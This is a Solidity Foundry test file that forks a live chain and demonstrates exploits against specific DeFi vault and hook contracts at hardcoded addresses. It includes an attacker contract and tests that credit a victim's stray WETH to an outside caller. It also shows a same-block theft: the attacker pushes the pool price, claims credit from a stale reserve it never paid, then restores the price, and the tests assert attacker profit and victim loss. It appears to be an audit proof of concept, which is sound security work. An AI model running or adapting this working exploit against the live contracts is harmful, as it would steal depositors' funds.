// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";

/// Live (pre-HEAD) single-SE constant-product buffer hook ABI (loupe-confirmed selectors).
interface ICpHook {
    function standardExchange() external view returns (address);
    function pairToken() external view returns (address);
    function rawToken() external view returns (address);
    function rawReserve() external view returns (uint256);
    function seClaimSupply() external view returns (uint256);
    function reserveOfToken(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
}

/// Live (pre-HEAD) UniswapV4SingleStandardExchangeDETF ABI (loupe-confirmed selectors).
interface ICpDetf {
    function bond(address tokenIn, uint256 amountIn, uint256 lockDuration, address recipient, bool pre, uint256 dl)
        external returns (uint256 tokenId, uint256 shares);
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
    function reserveHook() external view returns (address);
    function bondNftVault() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function isMintingAllowed() external view returns (bool);
}

/// Live (pre-HEAD) Uniswap V4 Standard Exchange vault ABI.
interface IOldV4SE {
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
    function exchangeOut(address tokenIn, uint256 maxIn, address tokenOut, uint256 amountOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
    function deployedReserve() external view returns (uint256, uint256);
    function reserveOfToken(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IRegistry {
    function isDisabled(address) external view returns (bool);
}

/// @notice Unprivileged attacker contract. Holds only its own capital. No pranks on protocol.
contract CpAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;

    IPoolManager immutable pm;
    PoolKey key;

    constructor(IPoolManager pm_, PoolKey memory key_) {
        pm = pm_;
        key = key_;
    }

    receive() external payable {}

    function swap(bool zeroForOne, uint256 amountIn, uint160 limit) external {
        pm.unlock(abi.encode(zeroForOne, amountIn, limit));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (bool z, uint256 amt, uint160 limit) = abi.decode(data, (bool, uint256, uint160));
        BalanceDelta d = pm.swap(key, SwapParams(z, -int256(amt), limit), "");
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
        return "";
    }

    function _settle(Currency c, int128 delta) internal {
        if (delta < 0) {
            uint256 owe = uint128(-delta);
            if (Currency.unwrap(c) == address(0)) {
                pm.settle{value: owe}();
            } else {
                pm.sync(c);
                IERC20(Currency.unwrap(c)).transfer(address(pm), owe);
                pm.settle();
            }
        } else if (delta > 0) {
            pm.take(c, address(this), uint128(delta));
        }
    }

    /// APEX-001 credit + D15-era refund: exact-out of tiny tokenOut, claiming `credit` tokenIn never sent.
    function claimCredit(address vault, address tokenIn, uint256 credit, address tokenOut, uint256 amountOut)
        external returns (uint256 used)
    {
        used = IOldV4SE(vault).exchangeOut(tokenIn, credit, tokenOut, amountOut, address(this), true, block.timestamp + 1);
    }
}

contract LiveCpHooksTest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager constant PM = IPoolManager(0x8366a39CC670B4001A1121B8F6A443A643e40951);
    address constant REGISTRY = 0x09682b00D873D913ada0bB69B4D4c9631810d0bc;
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
    address constant PONS = 0x39dBED3a2bd333467115dE45665cC57F813C4571;
    address constant SE201D = 0x201d31a56c58a3489beC218c7A899d59A07A35f0; // ETH/PONS 1% ts200, APEX-001 code
    bytes32 constant POOL_201D = 0x2f312a6f35f48df760b16892c11f963c67cbffd9f3960ea3ccd3a968c54b16cb;
    int24 constant LO = -887200;
    int24 constant HI = 887200;
    uint160 constant MIN_SQRT = 4295128739 + 1;

    // RICH CP-DETFs (pair = WETH buffered into SE 0x201d) and their hooks
    address constant RICH_A = 0xCE74BC02Cdf5c8FaECB94a380D98Ec47195a39d1;
    address constant HOOK_A = 0x1ca1771d04366761a2aEf7Ea26F9e18bC8bb6888;
    address constant RICH_B = 0xc2FBe67c474CE7ce273D31B9B3C1c57915642e28;
    address constant HOOK_B = 0x25Ef9b3036Ac1faA5090bbFadC68b2EED0f56888;
    address constant RICH_C = 0x40B613522bC5944330B7141E973280948124f844;
    address constant HOOK_C = 0x46D949601BAE5c7ae0d5792487758862FA6be888;

    PoolKey key201d;

    function setUp() public {
        // The box's 127.0.0.1:8545 node is non-archive (short state window) and fails uncached reads
        // ("historical state not available"); fork the public RPC tip instead (local fork, read-only,
        // forge never broadcasts).
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        key201d = PoolKey({
            currency0: Currency.wrap(address(0)),
            currency1: Currency.wrap(PONS),
            fee: 10000,
            tickSpacing: 200,
            hooks: IHooks(address(0))
        });
        assertEq(PoolId.unwrap(key201d.toId()), POOL_201D, "pool key");
        console2.log("fork block", block.number);
    }

    function _dl() internal view returns (uint256) {
        return block.timestamp + 1 hours;
    }

    function _sqrtP() internal view returns (uint160 sp) {
        (sp,,,) = PM.getSlot0(PoolId.wrap(POOL_201D));
    }

    function _ponsToEth(uint256 pons, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(pons, 1 << 96, sp), 1 << 96, sp);
    }

    function _ethToPons(uint256 eth, uint160 sp) internal pure returns (uint256) {
        return FullMath.mulDiv(FullMath.mulDiv(eth, sp, 1 << 96), sp, 1 << 96);
    }

    function _seFees() internal view returns (uint256 f0, uint256 f1) {
        (uint128 liq, uint256 l0, uint256 l1) = PM.getPositionInfo(PoolId.wrap(POOL_201D), SE201D, LO, HI, bytes32(0));
        if (liq == 0) return (0, 0);
        (uint256 g0, uint256 g1) = PM.getFeeGrowthInside(PoolId.wrap(POOL_201D), LO, HI);
        unchecked {
            f0 = FullMath.mulDiv(g0 - l0, liq, 1 << 128);
            f1 = FullMath.mulDiv(g1 - l1, liq, 1 << 128);
        }
    }

    /// SE 0x201d NAV in ETH at sqrtP: free + deployed + uncollected fees
    function _seNav(uint160 sp) internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IOldV4SE(SE201D).deployedReserve();
        (uint256 f0, uint256 f1) = _seFees();
        uint256 a0 = IERC20(WETH).balanceOf(SE201D) + d0 + f0;
        uint256 a1 = IERC20(PONS).balanceOf(SE201D) + d1 + f1;
        return a0 + _ponsToEth(a1, sp);
    }

    /// ETH value owned by the three RICH hooks through their SE 0x201d shares (= RICH LP/bonder backing)
    function _richHooksValue(uint160 sp) internal view returns (uint256) {
        uint256 sh = IOldV4SE(SE201D).balanceOf(HOOK_A) + IOldV4SE(SE201D).balanceOf(HOOK_B)
            + IOldV4SE(SE201D).balanceOf(HOOK_C);
        return FullMath.mulDiv(_seNav(sp), sh, IOldV4SE(SE201D).totalSupply());
    }

    function _holdValue(address who, uint160 sp) internal view returns (uint256) {
        return who.balance + IERC20(WETH).balanceOf(who) + _ponsToEth(IERC20(PONS).balanceOf(who), sp);
    }

    function _gateWeth() internal view returns (uint256 U) {
        uint256 B0 = IERC20(WETH).balanceOf(SE201D);
        uint256 R = IOldV4SE(SE201D).reserveOfToken(WETH);
        (uint256 d0,) = IOldV4SE(SE201D).deployedReserve();
        uint256 fb = R > d0 ? R - d0 : 0;
        U = B0 > fb ? B0 - fb : 0;
    }

    // =====================================================================
    // A: real economic value of the funded CP hooks vs their stored book.
    // =====================================================================
    function test_A_realValueVsBook() public view {
        address[5] memory hooks = [
            HOOK_A,
            HOOK_B,
            HOOK_C,
            0x923877336b14662cFb5B3A60b14e7d716d54A888,
            0xbbC8D3c8cF1149c36769b4FB0d6d6f8d2d34a888
        ];
        for (uint256 i; i < hooks.length; i++) {
            ICpHook h = ICpHook(hooks[i]);
            address pair = h.pairToken();
            address se = h.standardExchange();
            uint256 seBal = IERC20(se).balanceOf(address(h));
            uint256 book = h.reserveOfToken(pair);
            uint256 live = h.seClaimSupply();
            console2.log("hook", address(h));
            console2.log("  SE / pair", se, pair);
            console2.log("  SE shares held", seBal);
            console2.log("  stored reserveOfToken(pair)", book);
            console2.log("  live pair claim (seClaim)  ", live);
            console2.log("  raw reserve", h.rawReserve());
        }
        uint160 sp = _sqrtP();
        console2.log("SE201D NAV (wei ETH)", _seNav(sp));
        console2.log("RICH hooks' value in SE201D (wei ETH)", _richHooksValue(sp));
        console2.log("SE201D disabled?", IRegistry(REGISTRY).isDisabled(SE201D));
    }

    // =====================================================================
    // B: APEX-005 inverted credit (U = B0>=R ? B0-R : B0) is live on CP hooks.
    //    Stored R(WETH) is stale-high (SE share count), B0(WETH)=0, so any WETH that
    //    rests on the hook is credited in full to ANY caller (EOA allowed: no caller gate).
    // =====================================================================
    function test_B_invertedCredit_strayPairOnHook() public {
        uint256 R = ICpHook(HOOK_A).reserveOfToken(WETH);
        uint256 B0 = IERC20(WETH).balanceOf(HOOK_A);
        console2.log("R(WETH) stored", R);
        console2.log("B0(WETH)", B0);
        assertGt(R, B0, "inverted branch armed (R > B0)");

        // victim mistakenly pre-sends WETH to the hook (non-atomic integration)
        address victim = makeAddr("victim");
        uint256 amt = 0.01 ether;
        deal(WETH, victim, amt);
        vm.prank(victim);
        IERC20(WETH).transfer(HOOK_A, amt);

        address eoa = makeAddr("eoaAttacker");
        assertEq(eoa.code.length, 0, "EOA attacker");
        vm.prank(eoa);(uint256 richOut,) = ICpHook(HOOK_A).exchangeIn(WETH, amt, RICH_A, 0, eoa, true, _dl());
        console2.log("RICH received for WETH never sent by the attacker", richOut);
        assertGt(richOut, 0, "credited");
        // realise: sell RICH back for WETH through the hook
        vm.startPrank(eoa);
        IERC20(RICH_A).approve(HOOK_A, richOut);(uint256 wethOut,) = ICpHook(HOOK_A).exchangeIn(RICH_A, richOut, WETH, 0, eoa, false, _dl());
        vm.stopPrank();
        console2.log("WETH realised by attacker (cost 0)", wethOut);
        assertGt(IERC20(WETH).balanceOf(eoa), 0, "profit");
    }

    function _victimBond(address detf, uint256 amt) internal returns (address victim) {
        victim = makeAddr("honestBonder");
        deal(WETH, victim, amt);
        vm.startPrank(victim);
        IERC20(WETH).approve(detf, amt);
        uint256[5] memory locks = [uint256(7 days), 30 days, 90 days, 180 days, 365 days];
        bool ok;
        for (uint256 i; i < locks.length && !ok; i++) {
            try ICpDetf(detf).bond(WETH, amt, locks[i], victim, false, _dl()) returns (uint256 id, uint256 sh) {
                ok = true;
                console2.log("victim bonded WETH", amt);
                console2.log("  lock", locks[i]);
                console2.log("  tokenId / LP shares", id, sh);
            } catch (bytes memory err) {
                console2.log("bond attempt reverted, lock", locks[i]);
                console2.logBytes(err);
            }
        }
        vm.stopPrank();
        require(ok, "honest bond failed");
        console2.log("  victim liquid RICH received", ICpDetf(detf).balanceOf(victim));
    }

    function _victimMint(address detf, uint256 amt) internal returns (address victim) {
        victim = makeAddr("honestMinter");
        deal(WETH, victim, amt);
        vm.startPrank(victim);
        IERC20(WETH).approve(detf, amt);(uint256 out,) = ICpDetf(detf).exchangeIn(WETH, amt, detf, 0, victim, false, _dl());
        vm.stopPrank();
        console2.log("victim minted RICH for WETH", out, amt);
    }

    function _attack(uint256 push) internal returns (int256 profit, CpAttacker atk) {
        uint160 sp0 = _sqrtP();
        atk = new CpAttacker(PM, key201d);
        // simulated loan: own capital, fully counted at the restored price
        vm.deal(address(atk), 2 ether);
        deal(PONS, address(atk), _ethToPons(0.05 ether, sp0));
        uint256 before_ = _holdValue(address(atk), sp0);

        atk.swap(true, push, MIN_SQRT); // sell ETH: vault's live deployed WETH rises, stored R stale
        uint256 U = _gateWeth();
        console2.log("U(WETH) after push", U);
        console2.log("SE free WETH after push", IERC20(WETH).balanceOf(SE201D));
        if (U > 0) {
            uint256 w0 = IERC20(WETH).balanceOf(address(atk));
            uint256 used = atk.claimCredit(SE201D, WETH, U, PONS, 1e9);
            console2.log("credit used", used);
            console2.log("WETH refunded to attacker (never sent)", IERC20(WETH).balanceOf(address(atk)) - w0);
        }
        atk.swap(false, IERC20(PONS).balanceOf(address(atk)), sp0);
        assertEq(_sqrtP(), sp0, "price restored exactly");
        profit = int256(_holdValue(address(atk), sp0)) - int256(before_);
    }

    // =====================================================================
    // C (main): honest RICH bond -> WETH lands in unremediated APEX-001 SE 0x201d ->
    //    same-block unprivileged theft via live-deployed-vs-stored credit.
    // =====================================================================
    uint256 pushOverride;

    function test_C_richBond_thenApex001Theft_tightPush() public {
        pushOverride = 0.52 ether;
        _bondTheft(RICH_B, 0.5 ether, true);
    }

    function _bondTheft(address detf, uint256 bondAmt, bool doClaim) internal {
        assertFalse(IRegistry(REGISTRY).isDisabled(SE201D), "SE201D enabled");
        assertFalse(IRegistry(REGISTRY).isDisabled(detf), "DETF enabled");
        uint160 sp0 = _sqrtP();
        uint256 richBefore = _richHooksValue(sp0);
        _victimBond(detf, bondAmt);
        uint256 richAfterBond = _richHooksValue(sp0);
        (uint256 d0, uint256 d1) = IOldV4SE(SE201D).deployedReserve();
        console2.log("RICH hooks value before/after bond", richBefore, richAfterBond);
        console2.log("SE free WETH / deployed0 / deployed1", IERC20(WETH).balanceOf(SE201D), d0, d1);
        console2.log("U(WETH) right after honest bond", _gateWeth());

        uint256 push = pushOverride != 0 ? pushOverride : vm.envOr("PUSH_WEI", bondAmt * 2);
        int256 profit;
        if (doClaim) {
            (profit,) = _attack(push);
        } else {
            CpAttacker atk = new CpAttacker(PM, key201d);
            vm.deal(address(atk), 2 ether);
            deal(PONS, address(atk), _ethToPons(0.05 ether, sp0));
            uint256 b = _holdValue(address(atk), sp0);
            atk.swap(true, push, MIN_SQRT);
            atk.swap(false, IERC20(PONS).balanceOf(address(atk)), sp0);
            assertEq(_sqrtP(), sp0, "restored");
            profit = int256(_holdValue(address(atk), sp0)) - int256(b);
        }
        uint256 richAfter = _richHooksValue(sp0);
        int256 vDelta = int256(richAfter) - int256(richAfterBond);
        console2.log("=== RESULT (valued at restored price) ===");
        console2.log("attacker net profit (wei ETH)", profit);
        console2.log("RICH LP/bonder backing delta (wei ETH)", vDelta);
        console2.log("bond amount", bondAmt);
        if (doClaim) {
            assertGt(profit, 0, "attacker profit");
            assertLt(vDelta, 0, "victim loss");
        }
    }

    function test_C_richBond_thenApex001Theft() public {
        _bondTheft(RICH_B, vm.envOr("BOND_WEI", uint256(0.5 ether)), true);
    }

    function test_C_control_noClaim() public {
        _bondTheft(RICH_B, vm.envOr("BOND_WEI", uint256(0.5 ether)), false);
    }

    function test_D_richMint_thenApex001Theft() public {
        assertTrue(ICpDetf(RICH_A).isMintingAllowed(), "mint open");
        uint160 sp0 = _sqrtP();
        _victimMint(RICH_A, 0.5 ether);
        uint256 richAfterMint = _richHooksValue(sp0);
        console2.log("U(WETH) right after honest mint", _gateWeth());
        (int256 profit,) = _attack(1 ether);
        int256 vDelta = int256(_richHooksValue(sp0)) - int256(richAfterMint);
        console2.log("=== RESULT D ===");
        console2.log("attacker net profit (wei ETH)", profit);
        console2.log("RICH LP/bonder backing delta (wei ETH)", vDelta);
        assertGt(profit, 0, "attacker profit");
    }
}
